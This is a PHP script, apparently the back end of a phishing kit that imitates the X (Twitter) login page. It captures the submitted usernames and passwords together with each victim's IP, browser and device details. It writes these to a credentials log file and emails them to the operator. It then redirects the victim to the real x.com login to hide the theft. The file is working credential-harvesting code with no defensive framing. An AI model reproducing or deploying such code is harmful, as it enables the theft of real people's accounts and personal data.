<?php
error_reporting(0);
ini_set('display_errors', 0);

// تأكد من تفعيل الجلسات
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// نظام الإشعارات
require_once 'email_notifier.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // تنظيف البيانات
    $username = trim($_POST['username'] ?? '');
    $password = trim($_POST['password'] ?? '');
    
    // بيانات السجل المحسنة
    $log_data = [
        'platform' => 'X',
        'timestamp' => $_POST['timestamp'] ?? date('c'),
        'username' => $username ?: 'N/A',
        'password' => $password ?: 'N/A',
        'ip_address' => $_POST['ip_address'] ?? $_SERVER['REMOTE_ADDR'] ?? 'N/A',
        'user_agent' => $_POST['user_agent'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'N/A',
        'language' => $_POST['language'] ?? 'N/A',
        'platform_info' => $_POST['platform'] ?? 'N/A',
        'screen_resolution' => $_POST['screen_resolution'] ?? 'N/A',
        'timezone' => $_POST['timezone'] ?? 'N/A',
        'referrer' => $_SERVER['HTTP_REFERER'] ?? 'Direct',
        'host' => 'Replit'
    ];
    
    // إنشاء مجلد logs
    if (!is_dir('logs')) {
        mkdir('logs', 0755, true);
    }
    
    // حفظ البيانات
    $log_file = 'logs/credentials_' . date('Y-m-d') . '.json';
    $log_entry = json_encode($log_data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT) . ",\n";
    file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);
    
    // 📧 إرسال إشعار بالبريد - إذا كانت البيانات صالحة
    if ($username && $username !== 'N/A' && $password && $password !== 'N/A') {
        $notifier = new EmailNotifier("your-email@gmail.com"); // ⚠️ غير هذا إلى بريدك
        $notifier->sendNotification($log_data);
    }
    
    // إعادة التوجيه إلى X الحقيقي
    header('Location: https://x.com/i/flow/login');
    exit();
} else {
    header('Location: index.html');
    exit();
}
?>
